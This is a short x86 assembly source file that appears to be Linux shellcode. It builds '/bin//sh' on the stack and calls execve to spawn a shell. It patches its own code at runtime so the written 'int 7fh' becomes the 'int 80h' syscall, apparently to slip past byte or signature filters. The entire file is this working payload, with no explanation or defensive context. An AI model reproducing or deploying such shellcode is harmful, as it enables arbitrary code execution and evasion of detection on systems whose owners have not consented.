BITS 32
%define DIFF (0x10-5+1)
jmp short go

h0:
mov eax, [esp]
ret


go:
xor eax, eax
push eax
push 068732f2fh
push 06e69622fh
mov ebx, esp
push eax
mov edx, esp
push ebx

call h0
mov cl, -1h
sub [eax+DIFF], cl


xor eax, eax
mov al, 0bh
mov ecx, esp
int 7fh



